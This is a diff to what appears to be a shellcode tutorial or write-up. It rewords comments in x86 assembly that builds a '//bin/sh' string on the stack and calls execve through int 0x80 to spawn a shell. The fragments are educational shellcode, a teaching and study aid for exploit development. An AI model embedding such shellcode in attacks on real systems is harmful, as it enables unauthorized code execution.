@@ -659,8 +659,8 @@ Finally the execve syscall and the the program interrupt are called to execute t
 	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
 	push ebx	; push 0 onto the stack
 	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
-	mov al, 0x0b	; execve syscall
-  	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
+	mov al, 0x0b	; move syscall code for execve into al
+	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
 #### Assembly Code
@@ -735,7 +735,7 @@ _start:
 	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
 	push ebx	; push 0 onto the stack
 	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
-	mov al, 0x0b	; execve syscall
+	mov al, 0x0b	; move syscall code for execve into al
   	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ````
 
